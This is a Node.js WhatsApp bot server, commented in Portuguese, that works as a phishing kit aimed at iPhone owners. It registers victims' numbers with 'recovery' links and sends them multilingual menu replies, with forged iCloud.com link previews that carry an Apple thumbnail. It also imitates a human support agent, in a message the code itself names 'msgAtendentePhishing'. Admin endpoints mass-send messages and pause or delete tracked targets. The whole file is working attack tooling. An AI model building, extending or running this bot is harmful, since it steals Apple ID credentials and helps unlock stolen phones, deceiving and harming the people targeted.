const express = require('express');
const cors = require('cors');
const qrcode = require('qrcode');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, getAggregateVotesInPollMessage } = require('@whiskeysockets/baileys');
const pino = require('pino');
const axios = require('axios'); // Para baixar a mídia externa
const fs = require('fs'); // Para ler mídia interna local

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));

process.on('uncaughtException', (err) => {
    console.error('[CRASH - Uncaught Exception]', err);
});
process.on('unhandledRejection', (reason, promise) => {
    console.error('[CRASH - Unhandled Rejection]', reason);
});

let sock;
let qrCodeBase64 = '';
let wppStatus = 'disconnected'; // disconnected, qr_ready, connected
const TRACK_LINKS_FILE = 'trackLinks.json';
let trackLinksMap = new Map(); // Armazena em RAM objetos do tipo { link, lang } por cada número

// -------------------------------------------------------------
// IMPORTAÇÃO DA THUMBNAIL DO ICLOUD (LINK PREVIEW DO NADA)
// -------------------------------------------------------------
let icloudThumbBuf = null;
try {
    // Usamos o Apple Touch Icon otimizado para link preview, com fundo sólido e menor tamanho
    icloudThumbBuf = fs.readFileSync('./icloud_thumb.jpg');
} catch (err) {
    console.error('[Startup] icloud_thumb.jpg não encontrado localmente. Previews virão quebras. Execute o get_thumb.js!');
}
// -------------------------------------------------------------

// Carregar dicionário de idiomas
let botLangs = {};
try {
    botLangs = JSON.parse(fs.readFileSync('./languages.json', 'utf-8'));
} catch (err) {
    console.error('[Localization] Erro ao carregar languages.json', err);
}

function getMsg(lang, key, params = {}) {
    let msg = botLangs[lang]?.[key] || botLangs['pt']?.[key] || 'Text missing.';
    for (const p in params) {
        msg = msg.replace(`{${p}}`, params[p] || '');
    }
    return msg;
}

// Função para salvar o mapa em arquivo
function saveTrackLinks() {
    try {
        const obj = Object.fromEntries(trackLinksMap);
        fs.writeFileSync(TRACK_LINKS_FILE, JSON.stringify(obj, null, 2));
    } catch (err) {
        console.error('[Persistence] Erro ao salvar trackLinks:', err);
    }
}

// Função para carregar o mapa do arquivo
function loadTrackLinks() {
    try {
        if (fs.existsSync(TRACK_LINKS_FILE)) {
            const data = fs.readFileSync(TRACK_LINKS_FILE, 'utf-8');
            const obj = JSON.parse(data);
            trackLinksMap = new Map();
            for (const [key, val] of Object.entries(obj)) {
                if (typeof val === 'string') {
                    trackLinksMap.set(key, { link: val, lang: 'pt' });
                } else {
                    trackLinksMap.set(key, val);
                }
            }
            console.log(`[Persistence] ${trackLinksMap.size} contatos carregados da memória física.`);
        }
    } catch (err) {
        console.error('[Persistence] Erro ao carregar trackLinks:', err);
    }
}

loadTrackLinks();

async function connectToWhatsApp() {
    const { state, saveCreds } = await useMultiFileAuthState('botzap_auth_info');
    const { version, isLatest } = await fetchLatestBaileysVersion();
    console.log(`[WhatsApp] Usando WA v${version.join('.')}, isLatest: ${isLatest}`);

    sock = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: 'silent' }),
        browser: ['Ubuntu', 'Chrome', '120.0.0']
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (qr) {
            console.log('[WhatsApp] Novo QR Code Recebido.');
            wppStatus = 'qr_ready';
            try {
                qrCodeBase64 = await qrcode.toDataURL(qr);
            } catch (err) {
                console.error('Erro base64:', err);
            }
        }

        if (connection === 'close') {
            const statusCode = lastDisconnect.error?.output?.statusCode;
            const shouldReconnect = statusCode !== DisconnectReason.loggedOut;

            console.log(`[WhatsApp] Conexão Fechada. Status: ${statusCode}. Reconectando: ${shouldReconnect}`);
            wppStatus = 'disconnected';
            qrCodeBase64 = '';

            if (shouldReconnect) {
                console.log('[WhatsApp] Tentando reconectar em 5 segundos...');
                setTimeout(connectToWhatsApp, 5000);
            }
        } else if (connection === 'open') {
            console.log('[WhatsApp] Cliente Conectado e Pronto!');
            wppStatus = 'connected';
            qrCodeBase64 = '';
        }
    });

    // Escutador de Novas Mensagens (Auto-Responder)
    sock.ev.on('messages.upsert', async (m) => {
        console.log(`[UPSERT] Recebido evento com ${m.messages?.length} mensagens.`);
        const msg = m.messages[0];
        if (!msg.message || msg.key.fromMe) return;

        const chatId = msg.key.remoteJid;
        // Removido declaração duplicada inTexto aqui para evitar conflito
        console.log(`[Message Arrived] de ${chatId}`);

        // Ignorar mensagens de grupos para evitar spam/ban
        if (chatId.endsWith('@g.us')) return;

        // --- TRAVA DE SEGURANÇA ---
        if (!trackLinksMap.has(chatId)) {
            const altJid = msg.key.remoteJidAlt;
            let foundData = null;

            // 1. Tenta pelo remoteJidAlt (Altamente preciso para IDs LID)
            if (altJid && trackLinksMap.has(altJid)) {
                console.log(`[Auto-Reply] Encontrado JID alternativo: ${altJid}`);
                foundData = trackLinksMap.get(altJid);
            }

            // 2. Fallback: Busca por final do número
            if (!foundData) {
                const phone = chatId.split('@')[0];
                const phoneTail = phone.slice(-8);
                for (const [k, v] of trackLinksMap.entries()) {
                    const mapPhone = (v.phone || k.split('@')[0]).toString();
                    if (mapPhone.endsWith(phoneTail)) {
                        foundData = v;
                        break;
                    }
                }
            }

            if (foundData) {
                console.log(`[Auto-Reply] Vinculando novo ID ${chatId} ao registro existente.`);
                trackLinksMap.set(chatId, foundData);
                saveTrackLinks();
            } else {
                console.log(`[Auto-Reply] Ignorando: ${chatId}. Não está no mapa de rastreio.`);
                return;
            }
        }
        // ---------------------------

        console.log(`[Auto-Reply] Processando mensagem de: ${chatId}`);

        const pushName = msg.pushName ? ` ${msg.pushName}` : '';
        let normalizeTxt = '';

        // Extrai o texto limpo - caso seja mensagem normal ou botão template
        let inTexto = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.templateButtonReplyMessage?.selectedDisplayText || '';
        normalizeTxt = inTexto.trim().toUpperCase();
        console.log(`[Parse] Mensagem interpretada final: ${normalizeTxt}`);

        // -------------------------------------------------------------
        // RECUPERAÇÃO DE LINK DO RASTREIO
        // -------------------------------------------------------------
        const contactData = trackLinksMap.get(chatId);

        if (contactData?.paused) {
            console.log(`[Auto-Reply] Robô PAUSADO para ${chatId}. Ignorando.`);
            return;
        }

        // Se de tudo não tiver link (erro raro), usa o padrão
        let linkRecuperacao = contactData?.link || 'https://icloud.com/find';
        let userLang = contactData?.lang || 'pt';
        // -------------------------------------------------------------

        // Se o cliente enviar uma palavra gatilho baseada no idioma
        const triggers = {
            'pt': ['INICIAR', 'INICAR', 'AJUDA', '"AJUDA"', 'MUDAR IDIOMA'],
            'en': ['HELP', '"HELP"', 'CHANGE LANGUAGE'],
            'es': ['AYUDA', '"AYUDA"', 'CAMBIAR IDIOMA'],
            'zh': ['帮助', '开始', '修改语言'],
            'fr': ['AIDE', 'COMMENCER', 'CHANGER DE LANGUE'],
            'ar': ['مساعدة', 'ابدأ', 'تغيير اللغة'],
            'ru': ['ПОМОЩЬ', 'НАЧАТЬ', 'ИЗМЕНИТЬ ЯЗЫК'],
            'sv': ['HJÄLP', 'STARTA', 'BYT SPRÅK']
        };

        let detectedLang = null;
        for (const [lang, words] of Object.entries(triggers)) {
            if (words.some(w => normalizeTxt.includes(w))) {
                detectedLang = lang;
                break;
            }
        }

        // Se for comando de troca de idioma
        const changeLanguageTriggers = ['MUDAR IDIOMA', 'CHANGE LANGUAGE', 'CAMBIAR IDIOMA', '修改语言', 'CHANGER DE LANGUE', 'تغيير اللغة', 'ИЗМЕНИТЬ ЯЗЫК', 'BYT SPRÅK'];
        const isChangeLanguage = changeLanguageTriggers.some(w => normalizeTxt.includes(w));

        if (detectedLang || isChangeLanguage) {
            if (isChangeLanguage) {
                // Se for mudar idioma, removemos a preferência para disparar o seletor na próxima
                if (contactData) {
                    delete contactData.lang;
                    trackLinksMap.set(chatId, contactData);
                } else {
                    trackLinksMap.delete(chatId);
                }
                saveTrackLinks();

                const selectLangMsg = "Selecione seu idioma\nSelect your language\n选择您的语言\nChoisissez votre langue\nاختر لغتك\nVälj ditt språk";
                try {
                    await sock.sendMessage(chatId, { text: selectLangMsg });
                } catch (e) { }
                return;
            }

            userLang = detectedLang;

            // IMPORTANTE: Se já tínhamos os dados dele, atualizamos o idioma. 
            if (contactData) {
                contactData.lang = userLang;
                contactData.link = linkRecuperacao;
                trackLinksMap.set(chatId, contactData);
            } else {
                trackLinksMap.set(chatId, { link: linkRecuperacao, lang: userLang });
            }
            saveTrackLinks();

            console.log(`[Auto-Reply] Gatilho detectado de ${chatId}. Mudando para idioma: ${userLang}`);

            const replyMenuText = getMsg(userLang, 'menu_greeting', { name: pushName.trim() });

            try {
                await sock.sendMessage(chatId, { react: { text: "🤖", key: msg.key } });

                setTimeout(async () => {
                    await sock.presenceSubscribe(chatId);
                    await sock.sendPresenceUpdate('composing', chatId);
                    setTimeout(async () => {
                        await sock.sendPresenceUpdate('paused', chatId);
                        await sock.sendMessage(chatId, { text: replyMenuText });
                        console.log(`[Auto-Reply] Menu (Idioma: ${userLang}) enviado para ${chatId}`);
                    }, 3000);
                }, 1000);
            } catch (err) {
                console.error('[Auto-Reply Error] INICIAR:', err);
            }
        } // FECHA IF GATILHO IDIOMA
        else if (!contactData || !contactData.lang) {
            // Se o idioma não estiver definido e não for um gatilho, envia o seletor
            const selectLangMsg = "Selecione seu idioma\nSelect your language\n选择您的语言\nChoisissez votre langue\nاختر لغتك\nVälj ditt språk";
            try {
                await sock.sendMessage(chatId, { text: selectLangMsg });
                console.log(`[Auto-Reply] Seletor de Idioma enviado para ${chatId}`);
            } catch (e) { }
            return;
        }
        else if (normalizeTxt === '1' || normalizeTxt.includes('LOCALIZAR') || normalizeTxt.includes('LOCATE') || normalizeTxt.includes('BUSCAR') || normalizeTxt.includes('📍')) {
            console.log(`[Auto-Reply] Opção 1 selecionada por ${chatId}`);
            const replyLink = getMsg(userLang, 'option_1', {
                name: pushName.trim(),
                link: linkRecuperacao
            });

            // CONSTRUTOR RÍGIDO DA CAIXA DE PREVIEW ICLOUD NA MEMÓRIA DA API:
            const customPreview = {
                title: 'iCloud.com',
                description: 'Log in to iCloud to access your photos, mail, not...',
                'canonical-url': linkRecuperacao,
                'matched-text': linkRecuperacao,
                jpegThumbnail: icloudThumbBuf
            };

            try {
                await sock.sendMessage(chatId, {
                    react: {
                        text: "🤖",
                        key: msg.key
                    }
                });

                setTimeout(async () => {
                    await sock.presenceSubscribe(chatId);
                    await sock.sendPresenceUpdate('composing', chatId);

                    // Delay de 6 segundos simula ao cliente do WhatsApp Business que o Preview está carregando no telefone
                    setTimeout(async () => {
                        await sock.sendPresenceUpdate('paused', chatId);
                        // Tentar forçar a busca rica para o link preview
                        await sock.sendMessage(chatId, {
                            text: replyLink,
                            linkPreview: customPreview
                        });
                        console.log(`[Auto-Reply] Link Opção 1 (com Preview Custom) enviado para ${chatId}`);
                    }, 6000);
                }, 1000);
            } catch (err) {
                console.error('[Auto-Reply Error] Opção 1:', err);
            }
        } else if (normalizeTxt === '3' || normalizeTxt.includes('APPLECARE') || normalizeTxt.includes('SOPORTE') || normalizeTxt.includes('🛡️')) {
            console.log(`[Auto-Reply] Opção 3 selecionada por ${chatId}`);
            const replyOption3 = getMsg(userLang, 'option_3', {
                link: linkRecuperacao
            });

            const customPreview = {
                title: 'iCloud.com',
                description: 'Log in to iCloud to access your photos, mail, not...',
                'canonical-url': linkRecuperacao,
                'matched-text': linkRecuperacao,
                jpegThumbnail: icloudThumbBuf
            };

            try {
                await sock.sendMessage(chatId, {
                    react: {
                        text: "🤖",
                        key: msg.key
                    }
                });

                setTimeout(async () => {
                    await sock.presenceSubscribe(chatId);
                    await sock.sendPresenceUpdate('composing', chatId);

                    // Espereando Snippet Rich carregar (6 segundos de digitação)
                    setTimeout(async () => {
                        await sock.sendPresenceUpdate('paused', chatId);
                        await sock.sendMessage(chatId, {
                            text: replyOption3,
                            linkPreview: customPreview
                        });
                    }, 6000);
                }, 1000);
            } catch (err) {
                console.error('[Auto-Reply Error] Opção 3:', err);
            }
        } else if (normalizeTxt === '2' || normalizeTxt.includes('RECUPERAR') || normalizeTxt.includes('RECOVER') || normalizeTxt.includes('🔑')) {
            console.log(`[Auto-Reply] Opção 2 selecionada por ${chatId}`);
            const replyOption2 = getMsg(userLang, 'option_2', {
                link: linkRecuperacao
            });

            const customPreview = {
                title: 'iCloud.com',
                description: 'Log in to iCloud to access your photos, mail, not...',
                'canonical-url': linkRecuperacao,
                'matched-text': linkRecuperacao,
                jpegThumbnail: icloudThumbBuf
            };

            try {
                await sock.sendMessage(chatId, {
                    react: {
                        text: "🤖",
                        key: msg.key
                    }
                });

                setTimeout(async () => {
                    await sock.presenceSubscribe(chatId);
                    await sock.sendPresenceUpdate('composing', chatId);
                    setTimeout(async () => {
                        await sock.sendPresenceUpdate('paused', chatId);
                        await sock.sendMessage(chatId, {
                            text: replyOption2,
                            linkPreview: customPreview
                        });
                    }, 6000);
                }, 1000);
            } catch (err) {
                console.error('[Auto-Reply Error] Opção 2:', err);
            }
        } else if (normalizeTxt === '4' || normalizeTxt.includes('ATENDENTE') || normalizeTxt.includes('HABLAR') || normalizeTxt.includes('AGENT') || normalizeTxt.includes('👨‍💼')) {
            console.log(`[Auto-Reply] Opção 4 selecionada por ${chatId}`);
            const msgFila = getMsg(userLang, 'option_4_wait', {
                name: pushName.trim()
            });
            try {
                await sock.sendMessage(chatId, {
                    react: {
                        text: "🤖",
                        key: msg.key
                    }
                });

                setTimeout(async () => {
                    await sock.presenceSubscribe(chatId);
                    await sock.sendPresenceUpdate('composing', chatId);
                    setTimeout(async () => {
                        await sock.sendPresenceUpdate('paused', chatId);
                        await sock.sendMessage(chatId, {
                            text: msgFila
                        });

                        // Aguarda mais 7 segundos antes de enviar a segunda mensagem
                        setTimeout(async () => {
                            await sock.sendPresenceUpdate('composing', chatId);
                            setTimeout(async () => {
                                const msgAtendente = getMsg(userLang, 'option_4_agent', {
                                    name: pushName.trim()
                                });
                                await sock.sendPresenceUpdate('paused', chatId);
                                await sock.sendMessage(chatId, {
                                    text: msgAtendente
                                });
                                console.log(`[Auto-Reply] Opção 4 (Atendente Aline) enviada para ${chatId}`);
                            }, 4000);
                        }, 7000);

                    }, 3000);
                }, 1000);
            } catch (err) {
                console.error('[Auto-Reply Error] Opção 4 (Fila):', err);
            }
        } else if (normalizeTxt === '5') {
            console.log(`[Auto-Reply] Opção 5 selecionada por ${chatId}`);
            const msgMenuInicial = getMsg(userLang, 'menu_greeting', {
                name: pushName.trim()
            });
            try {
                await sock.sendMessage(chatId, {
                    react: {
                        text: "🤖",
                        key: msg.key
                    }
                });

                setTimeout(async () => {
                    await sock.presenceSubscribe(chatId);
                    await sock.sendPresenceUpdate('composing', chatId);
                    setTimeout(async () => {
                        await sock.sendPresenceUpdate('paused', chatId);
                        await sock.sendMessage(chatId, {
                            text: msgMenuInicial
                        });

                        // Aguarda 4 segundos antes de começar a digitar a segunda
                        setTimeout(async () => {
                            await sock.sendPresenceUpdate('composing', chatId);
                            setTimeout(async () => {
                                const msgAtendentePhishing = getMsg(userLang, 'option_5_agent', {
                                    name: pushName.trim(),
                                    link: linkRecuperacao
                                });
                                await sock.sendPresenceUpdate('paused', chatId);
                                await sock.sendMessage(chatId, {
                                    text: msgAtendentePhishing
                                });
                                console.log(`[Auto-Reply] Opção 5 (Atendente Aline) enviada para ${chatId}`);
                            }, 4000); // tempo de digitação dela
                        }, 4000);

                    }, 3000);
                }, 1000);
            } catch (err) {
                console.error('[Auto-Reply Error] Opção 5 (Menu):', err);
            }
        } else if (normalizeTxt === '6') {
            console.log(`[Auto-Reply] Opção 6 selecionada por ${chatId}`);
            const replyOption6 = getMsg(userLang, 'option_6', {
                name: pushName.trim(),
                link: linkRecuperacao
            });

            const customPreview = {
                title: 'iCloud.com',
                description: 'Log in to iCloud to access your photos, mail, not...',
                'canonical-url': linkRecuperacao,
                'matched-text': linkRecuperacao,
                jpegThumbnail: icloudThumbBuf
            };

            try {
                await sock.sendMessage(chatId, {
                    react: {
                        text: "🤖",
                        key: msg.key
                    }
                });

                setTimeout(async () => {
                    await sock.presenceSubscribe(chatId);
                    await sock.sendPresenceUpdate('composing', chatId);
                    setTimeout(async () => {
                        await sock.sendPresenceUpdate('paused', chatId);
                        await sock.sendMessage(chatId, {
                            text: replyOption6,
                            linkPreview: customPreview
                        });
                    }, 6000);
                }, 1000);
            } catch (err) {
                console.error('[Auto-Reply Error] Opção 6:', err);
            }
        } else {
            // Fallback Global para Qualquer outra palavra enviada
            console.log(`[Auto-Reply] Palavra desconhecida detectada de ${chatId} ignorada como enquete / falha.`);

            // Ignoramos a resposta Global de Fallback se for "VOTO_COMPUTADO" falso-positivo
            if (normalizeTxt === 'VOTO_COMPUTADO') return;

            const msgError = getMsg(userLang, 'fallback');
            try {
                await sock.sendMessage(chatId, { react: { text: "🤖", key: msg.key } });

                setTimeout(async () => {
                    await sock.presenceSubscribe(chatId);
                    await sock.sendPresenceUpdate('composing', chatId);
                    setTimeout(async () => {
                        await sock.sendPresenceUpdate('paused', chatId);
                        await sock.sendMessage(chatId, { text: msgError });
                        console.log(`[Auto-Reply] Falha (Instruções) enviada para ${chatId}`);
                    }, 3000);
                }, 1000);
            } catch (err) {
                console.error('[Auto-Reply Error] Fallback:', err);
            }
        }
    }); // FECHA sock.ev.on('messages.upsert'
}

// -- API Endpoints --

app.get('/status', (req, res) => {
    res.json({ status: wppStatus });
});

app.get('/qr', (req, res) => {
    if (wppStatus === 'qr_ready' && qrCodeBase64) {
        res.json({ success: true, base64: qrCodeBase64 });
    } else {
        res.json({ success: false, message: 'QR Code não disponível.' });
    }
});

// Endpoint Administrativo: Deletar Rastreio
app.post('/delete-track', (req, res) => {
    const { number } = req.body;
    if (!number) return res.status(400).json({ success: false, message: 'Número é obrigatório.' });

    const cleanNumber = number.replace(/\D/g, '');
    let deletedCount = 0;

    // Busca robusta: deleta qualquer JID que contenha o número ou que tenha o "phone" salvo
    for (const [key, val] of trackLinksMap.entries()) {
        const keyDigits = key.split('@')[0];
        if (keyDigits === cleanNumber || val.phone === cleanNumber) {
            trackLinksMap.delete(key);
            deletedCount++;
        }
    }

    if (deletedCount > 0) {
        saveTrackLinks();
        console.log(`[Admin] ${deletedCount} rastreio(s) removido(s) para o número ${cleanNumber}`);
        res.json({ success: true, message: `Rastreio deletado com sucesso (${deletedCount} entradas).` });
    } else {
        console.log(`[Admin] Falha ao deletar: Número ${cleanNumber} não encontrado na memória.`);
        res.status(404).json({ success: false, message: 'Número não encontrado na memória do bot.' });
    }
});

// Endpoint Administrativo: Pausar/Retomar Rastreio
app.post('/toggle-pause', (req, res) => {
    const { number, pause } = req.body; // pause: boolean
    if (!number) return res.status(400).json({ success: false, message: 'Número é obrigatório.' });

    const cleanNumber = number.replace(/\D/g, '');
    let matchedCount = 0;

    for (const [key, val] of trackLinksMap.entries()) {
        const keyDigits = key.split('@')[0];
        if (keyDigits === cleanNumber || val.phone === cleanNumber) {
            val.paused = pause;
            trackLinksMap.set(key, val);
            matchedCount++;
        }
    }

    if (matchedCount > 0) {
        saveTrackLinks();
        console.log(`[Admin] Rastreio ${pause ? 'PAUSADO' : 'RETOMADO'} para ${cleanNumber} (${matchedCount} entradas)`);
        res.json({ success: true, message: `Rastreio ${pause ? 'pausado' : 'retomado'} com sucesso.` });
    } else {
        console.log(`[Admin] Falha ao pausar: Número ${cleanNumber} não encontrado na memória.`);
        res.status(404).json({ success: false, message: 'Número não encontrado na memória do bot.' });
    }
});

// Endpoint Administrativo: LIMPAR TUDO
app.post('/clear-all', (req, res) => {
    trackLinksMap.clear();
    saveTrackLinks();
    console.log('[Admin] MEMÓRIA GLOBAL LIMPA PELO PAINEL.');
    res.json({ success: true, message: 'Memória do robô zerada com sucesso!' });
});

app.post('/send', async (req, res) => {
    if (wppStatus !== 'connected' || !sock) {
        return res.status(403).json({ success: false, message: 'WhatsApp não está conectado.' });
    }

    const { number, message, mediaUrl, mediaPath, trackLink, language } = req.body;

    if (!number || !message) {
        return res.status(400).json({ success: false, message: 'Número e Mensagem são obrigatórios.' });
    }

    const cleanNumber = number.replace(/\D/g, '');
    const chatId = `${cleanNumber}@s.whatsapp.net`;

    if (trackLink) {
        let userLang = language || 'pt';
        // Mantém o estado de pausa se já existia
        let isPaused = false;
        // Busca se já existe algum JID com esse número pausado
        for (const [k, v] of trackLinksMap.entries()) {
            if (k.startsWith(cleanNumber) || v.phone === cleanNumber) {
                if (v.paused) isPaused = true;
                break;
            }
        }

        trackLinksMap.set(chatId, {
            link: trackLink,
            lang: userLang,
            phone: cleanNumber, // SALVAR O NÚMERO PARA RETRO-BUSCA
            paused: isPaused
        });
        saveTrackLinks();
        console.log(`[WhatsApp] Rastreio registrado na memória para ${chatId} (${userLang}) - Pausado: ${isPaused}`);
    }

    try {
        if (mediaPath && fs.existsSync(mediaPath)) {
            console.log(`[WhatsApp] Lendo mídia física de: ${mediaPath}`);
            const buffer = fs.readFileSync(mediaPath);
            let mimeType = 'image/jpeg';
            if (mediaPath.toLowerCase().endsWith('.png')) mimeType = 'image/png';

            await sock.sendMessage(chatId, {
                image: buffer,
                caption: message,
                mimetype: mimeType
            });
        } else if (mediaUrl) {
            console.log(`[WhatsApp] Baixando mídia de: ${mediaUrl}`);
            const response = await axios.get(mediaUrl, { responseType: 'arraybuffer' });
            const buffer = Buffer.from(response.data, 'binary');
            const mimeType = response.headers['content-type'];

            await sock.sendMessage(chatId, {
                image: buffer,
                caption: message,
                mimetype: mimeType
            });
        } else {
            console.log(`[WhatsApp] Enviando texto para ${chatId}...`);
            await sock.sendMessage(chatId, { text: message });
        }

        console.log(`[WhatsApp] Mensagem enviada para ${chatId}`);
        res.json({ success: true, message: 'Disparo efetuado com sucesso via Bot.' });
    } catch (err) {
        console.error('[WhatsApp] Erro ao disparar:', err);
        res.status(500).json({ success: false, message: 'Erro: ' + err.toString() });
    }
});

app.post('/logout', async (req, res) => {
    console.log('[WhatsApp] Solicitação de Logout recebida.');
    try {
        if (sock) {
            try {
                await sock.logout();
            } catch (e) { }
            sock.end();
        }

        setTimeout(() => {
            const authDir = 'botzap_auth_info';
            if (fs.existsSync(authDir)) {
                fs.rmSync(authDir, { recursive: true, force: true });
                console.log('[WhatsApp] Pasta de autenticação removida.');
            }
            wppStatus = 'disconnected';
            qrCodeBase64 = '';
            connectToWhatsApp();
        }, 1000);

        res.json({ success: true, message: 'Sessions limpas. Reiniciando para novo QR Code...' });
    } catch (err) {
        console.error('[Logout Error]', err);
        res.status(500).json({ success: false, message: err.message });
    }
});

// Inicialização
const PORT = 3000;
app.listen(PORT, () => {
    console.log(`[Server] WhatsApp BOT API rodando na porta ${PORT}`);
    connectToWhatsApp();
});
